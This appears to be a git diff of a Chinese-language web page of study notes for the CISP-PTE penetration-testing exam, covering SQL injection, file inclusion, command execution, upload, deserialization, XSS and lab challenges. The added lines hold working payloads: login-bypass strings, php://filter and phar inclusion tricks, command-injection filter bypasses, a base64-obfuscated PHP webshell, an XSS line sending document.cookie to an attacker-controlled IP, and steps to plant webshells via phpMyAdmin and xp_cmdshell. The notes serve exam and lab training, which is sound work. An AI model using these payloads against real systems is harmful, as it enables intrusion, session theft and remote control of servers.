@@ -1046,6 +1046,19 @@
     命令执行
   </a>
   
+    <nav class="md-nav" aria-label="命令执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rce" class="md-nav__link">
+    命令执行(RCE)面对各种过滤，骚姿势绕过总结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1063,14 +1076,28 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#xsscookie" class="md-nav__link">
+    xss打cookie
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#_5" class="md-nav__link">
-    日志审计
+    访问控制
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_6" class="md-nav__link">
+    日志审计
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
     综合题目
   </a>
   
@@ -1092,6 +1119,11 @@
   <h1>Cisp pte满分做</h1>
 
 <h3 id="sql">sql注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
+<p><img alt="image-20220718212513907" src="https://cdn.jsdelivr.net/gh/klsfct/images_mkdocs/Img/image-20220718212513907.png" /></p>
+<p>万能密码</p>
+<p>’ ‘ or '1'='1'</p>
+<p>admin' Oorr '1'='1</p>
+<p>或者sqlmap跑</p>
 <p>一次注入</p>
 <div class="highlight"><pre><span></span><code><span class="k">insert</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="p">(</span><span class="n">uname</span><span class="p">,</span><span class="n">password</span><span class="p">),</span><span class="n">value</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;pass&#39;</span><span class="p">)</span><span class="w"></span>
 
@@ -1231,12 +1263,26 @@ fu1.php?id=1.1&#39;)ununionion/**/seselectlect/**/1,load_file(&#39;/tmp/360/key&
 
 
 <span class="k">select</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()</span><span class="s1">&#39;&#39;</span><span class="w">  </span><span class="k">from</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">ema</span><span class="w"></span>
+
+<span class="err">先注册</span><span class="w"> </span><span class="k">admin</span><span class="err">&#39;</span><span class="o">#</span><span class="w"> </span>
+<span class="err">在注册一个带单引号的</span><span class="w"> </span><span class="o">#</span><span class="w"></span>
+<span class="err">在修改</span><span class="w"> </span><span class="k">admin</span><span class="err">‘</span><span class="o">#</span><span class="err">的密码</span><span class="w"> </span><span class="err">这样修改的就是</span><span class="n">admin的密码</span><span class="w"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>select * from Article where uuid = &#39;983fd952-df4e-4b63-946f-f2e6bb0327d6&#39; and &#39;1&#39;=&#39;1&#39;
+
+过滤了-- 和#号
+可以用 and &#39;1&#39;直接绕过，也可以用  ;%00 做截断
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>注册账号，发表文章
+on抓包提取文章的链接
 </code></pre></div>
 <h3 id="_1">文件包含<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <p>先去访问这个包含的页面，是否是解析</p>
+<p>五星推荐https://<a href="http://www.cnblogs.com/ichunqiu/p/10683379.html">www.cnblogs.com/ichunqiu/p/10683379.html</a></p>
 <p>1.伪协议</p>
 <p>过滤一些关键字可以 双写，大小写</p>
 <div class="highlight"><pre><span></span><code><span class="n">index</span><span class="o">.</span><span class="n">php?page</span><span class="o">=</span><span class="ss">php</span><span class="p">:</span><span class="sr">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="sr">/etc/</span><span class="n">passwd</span>
+<span class="ss">php</span><span class="p">:</span><span class="sr">//</span><span class="n">filter</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=../</span><span class="n">key</span><span class="o">.</span><span class="n">php</span>
 
 <span class="o">&gt;&gt;</span> <span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="sr">/etc/</span><span class="n">passwd</span>
 
@@ -1244,12 +1290,41 @@ fu1.php?id=1.1&#39;)ununionion/**/seselectlect/**/1,load_file(&#39;/tmp/360/key&
 
 <span class="n">index</span><span class="o">.</span><span class="n">php?page</span><span class="o">=</span><span class="ss">phphp</span><span class="p">:</span><span class="sr">//</span><span class="nb">p</span><span class="ss">:/</span><span class="o">/</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=../</span><span class="n">key</span><span class="o">.</span><span class="n">php</span>
 <span class="sr">/index.php?page=pphp:/</span><span class="o">/</span><span class="ss">hp</span><span class="p">:</span><span class="sr">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="n">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=../</span><span class="n">key</span><span class="o">.</span><span class="n">php</span>
+
+<span class="p">?</span><span class="n">phar</span>
+</code></pre></div>
+<p>只能上传txt,但是有一个可以读取编译成php的文件</p>
+<p>用phar的伪协议 要先进行压缩，ceshi.php变成压缩包再换成.txt</p>
+<p>本质上还是zip压缩包所以用phar协议</p>
+<p><a href="http://150.158.88.26:10004/lfi.php?file=phar://files/GHABsTD1XQQRq8Q6.txt/ceshi">http://150.158.88.26:10004/lfi.php?file=phar://files/GHABsTD1XQQRq8Q6.txt/ceshi</a></p>
+<div class="highlight"><pre><span></span><code>&gt;&gt; hello.txt
+http://123.60.47.130:38893/start/index.php?page=hello
+
+data伪协议或者远程文件包含
+可以用data:text/plain,&lt;?php phpinfo();?&gt;
+&lt;?php system(&quot;cat ../key.php&quot;); ?&gt;.txt
+</code></pre></div>
+<p>小马</p>
+<div class="highlight"><pre><span></span><code>&lt;?php 
+@$a = $_POST[&#39;Hello&#39;]; 
+if(isset($a)){ 
+@preg_replace(&quot;/\[(.*)\]/e&quot;,&#39;\\1&#39;,base64_decode(&#39;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#39;)); 
+} 
+?&gt;
+Hello
+&lt;br&gt;
+Are you ok?
+
+文件包含 ，此文件是小马
 </code></pre></div>
 <h3 id="_2">命令执行<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p><a href="https://zhuanlan.zhihu.com/p/391439312">https://zhuanlan.zhihu.com/p/391439312</a></p>
+<h4 id="rce">命令执行(RCE)面对各种过滤，骚姿势绕过总结<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h4>
 <p>代码审计</p>
 <p>看get还是post类型</p>
 <p>可能会过滤key，用ke*   绕过命令执行   l's ''-la   c'a't</p>
 <p>7<span class="arithmatex"><span class="MathJax_Preview">IFS</span><script type="math/tex">IFS</script></span>9. ./ke*</p>
+<p>看看是否有一些过滤的执行函数</p>
 <div class="highlight"><pre><span></span><code>&lt;?php
 error_reporting<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>
 include <span class="s2">&quot;key4.php&quot;</span><span class="p">;</span>
@@ -1267,6 +1342,7 @@ eval<span class="o">(</span><span class="s2">&quot;\$o=strtolower(\&quot;</span>
 eval<span class="o">(</span><span class="s2">&quot;\$o=strtolower(\&quot; &quot;</span><span class="o">)</span><span class="p">;</span>system<span class="o">(</span><span class="s1">&#39;ls&#39;</span><span class="o">)</span><span class="p">;</span><span class="o">(</span><span class="s2">&quot;     \&quot;);&quot;</span><span class="o">)</span><span class="p">;</span>
 
 /index.php?a<span class="o">=</span><span class="s2">&quot;);system(&#39;ls&#39;);(&quot;</span>
+<span class="nv">a</span><span class="o">=</span><span class="si">${</span><span class="nv">system</span><span class="p">(</span><span class="s2">&quot;cat key4.php&quot;</span><span class="p">)</span><span class="si">}</span>  这种是大变量形式
 </code></pre></div>
 <p>2.文件可解析为执行文件php</p>
 <p>pre /e马**只能菜刀**</p>
@@ -1279,6 +1355,11 @@ if(isset($a)){
 </code></pre></div>
 <p>preg_replace() /e代码执行漏洞</p>
 <p>命令执行</p>
+<div class="highlight"><pre><span></span><code>PHP代码执行函数：
+eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等
+PHP命令执行函数：
+system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
+</code></pre></div>
 <p>0x03借助命令Is 查看key的权限←
 127.0. 0.1.&amp; ‘|’
 s-al.. . /var/www/htm | /key. ph*←
@@ -1303,13 +1384,35 @@ Content-Di sposition: form- data; name=" cmd'
 ---1735104427133--
 ←
 0x05借助命令Is 验证key的权限←</p>
+<div class="highlight"><pre><span></span><code>命令执行ping
+1.判断管道符   ； | &amp; || &amp;&amp;
+
+2，绕过 127.0.0.1;l&#39;s  ../
+有无权限 加  c&#39;h&#39;o&#39;m&#39;d 777
+cat 过滤了用  cat  ./ke?.??
+
+
+
+先复制权限
+
+验证主机是否存活
+用来读文件
+http://123.60.47.130:8384/vulnerabilities/fu1.php
+cmd=127.0.0.1
+
+要对文件进行可读权限，
+
+常用的绕过  ls 
+</code></pre></div>
 <h3 id="_3">文件上传<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p><a href="https://blog.csdn.net/weixin_43795682/article/details/118274320">https://blog.csdn.net/weixin_43795682/article/details/118274320</a></p>
 <p>1.文件上传后被修改了文件名，利用burp爆破</p>
 <div class="highlight"><pre><span></span><code><span class="x">$filename = $files[&quot;name&quot;]; //456</span>
 <span class="x"> $randnum = rand(1, 99999);  //123</span>
 <span class="x"> $fullpath = &#39;/&#39; . md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;) + 1); </span>
 
-<span class="x"> /md5(456123).php</span>
+<span class="x">上传名字sqzr.php</span>
+<span class="x"> /md5(sqzr.php456123).php</span>
 
 <span class="x"> 网站根目录</span>
 <span class="x"> /md5(文件全名+rand(1, 99999))</span>
@@ -1343,6 +1446,9 @@ if (unserialize($str) === $TEMP)
     echo &quot;$key4&quot;;
 }
 show_source(__FILE__); 
+
+
+  str=s:44:&quot;Whatever is worth doing is worth doing well.&quot;;
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><span class="x">class 123</span>
 <span class="x">{</span>
@@ -1369,12 +1475,6 @@ show_source(__FILE__);
 <span class="x">$a()</span>
 </code></pre></div>
 <p>参考ctfshow256</p>
-<div class="highlight"><pre><span></span><code>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>} 
-</code></pre></div>
 <div class="highlight"><pre><span></span><code>&lt;?php 
 
 class ctfuser{ 
@@ -1382,17 +1482,68 @@ class ctfuser{
 
 //O%3A7%3A%22ctfuser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
 </code></pre></div>
-<p>xss打cookie</p>
+<h3 id="xsscookie">xss打cookie<a class="headerlink" href="#xsscookie" title="Permanent link">&para;</a></h3>
 <p>评论留言页面</p>
 <p>python启动简易服务器9999</p>
 <p>1：攻击机起服务监听
 python -m SimpleHTTPServer 9999</p>
 <p>2:往攻击机插js语句</p>
 <div class="highlight"><pre><span></span><code>&quot;&gt;&lt;script&gt;document.write(&#39;&lt; img src=&quot;http://172.16.143.13:9999/?&#39;+document.cookie+&#39;&quot; /&gt;&#39;)&lt;/script&gt;
+
+拿到sessin登录
+或者seessino有key
 </code></pre></div>
-<h3 id="_5">日志审计<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="nv">$v1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nb">json_decode</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;w&#39;</span><span class="p">]);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">is_numeric</span><span class="p">(</span><span class="o">@</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar1&quot;</span><span class="p">])</span> <span class="o">?</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;nope&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="k">NULL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar1&quot;</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar1&quot;</span><span class="p">]);</span>
+        <span class="nv">$ww</span><span class="o">=</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar1&quot;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">2020</span><span class="p">;</span>
+        <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$ww</span><span class="p">);</span>
+        <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar1&quot;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">2020</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$v1</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">:</span> <span class="k">NULL</span><span class="p">;</span>
+
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar2&quot;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar2&quot;</span><span class="p">])</span> <span class="o">!==</span> <span class="mi">5</span> <span class="k">OR</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar2&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;nope&quot;</span><span class="p">);</span>
+        <span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="s2">&quot;cisp-pte&quot;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar3&quot;</span><span class="p">]);</span>
+        <span class="nv">$pos</span> <span class="o">===</span> <span class="k">false</span> <span class="o">?</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;nope&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="k">NULL</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;bar2&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$val</span> <span class="o">===</span> <span class="s2">&quot;cisp-pte&quot;</span> <span class="o">?</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;nope&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="k">NULL</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$v1</span> <span class="o">&amp;&amp;</span> <span class="nv">$v2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">include</span><span class="p">(</span><span class="s2">&quot;key.php&quot;</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$key</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+
+<span class="x">http://123.60.47.130:10031/code1.php?w={&quot;bar1&quot;:“2021w”  php弱类型</span>
+<span class="x">    &quot;bar2&quot;:[[1],2,3,4,5]</span>
+<span class="x">&quot;bar3&quot;:[&quot;cisp-pte&quot;]</span>
+</code></pre></div>
+<h3 id="_5">访问控制<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>失效的访问控制
+请使用admin用户访问权限获取KEY
+
+添加X-Forwarded-F
+cookie中修改 base64 为admin
+</code></pre></div>
+<h3 id="_6">日志审计<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <p>admin.*php.*200</p>
-<h3 id="_6">综合题目<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h3 id="_7">综合题目<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <p>IP地址</p>
 <p><img alt="image-20220524184830506" src="images/image-20220524184830506.png" /></p>
 <p>扫端口</p>
@@ -1401,7 +1552,7 @@ python -m SimpleHTTPServer 9999</p>
 <p>开启3389，防火墙放行</p>
 <div class="highlight"><pre><span></span><code>http://119.91.93.173/
 
-
+1.端口扫描
 nmap -sV -T5 -p 1434,1433,1025,8080,80 119.91.93.173
 
 PORT     STATE SERVICE    VERSION
@@ -1411,6 +1562,56 @@ PORT     STATE SERVICE    VERSION
 1434/tcp open  tcpwrapped
 8080/tcp open  http       Microsoft IIS httpd 6.0
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+22 ftp匿名登陆
+浏览器ftp://ip可以访问后台页面
+1433 sqlserver sa提权
+
+
+
+2.扫描web目录
+找敏感文件
+是否有参数  可能包含文件包含或者注入漏洞
+
+config 
+phpinfo的web路径  script-filename的值
+
+后台登陆页面
+
+通过得到数据库连接密码得到key
+
+
+3.登录后台
+看有无上传的点
+pdf文件和上传后的路径
+上传后是否能解析，要结合文件解析
+用绝对路径包含文件  用php://filter/convert.base64encode
+
+4.连接上传shell
+可以用xp_cmdshell  上传改后缀或者直接写马
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>http://123.60.47.130:58125/
+
+1.401密码暴力破解
+2.用burp爆破目录
+3.访问robots.txt 得到key  User-agent: * Disallow: /news/
+4.爆破目录加/news/
+得到phpadmin目录
+
+5.phpadmin写马
+phpmyadmin中写马两种思路https://blog.csdn.net/qq_33942040/article/details/108577874
+
+或者弱口令
+得到key
+
+菜刀和ant链接
+
+ant连接不成功，要换编码器base编码，或者用菜刀
+
+6.3389
+上传3389bat
+远程登录
+得到key
 </code></pre></div>
 
   <hr>
@@ -1418,7 +1619,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-05-27 23:23:51</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-07-27 22:31:40</span>
       
     
   </small>
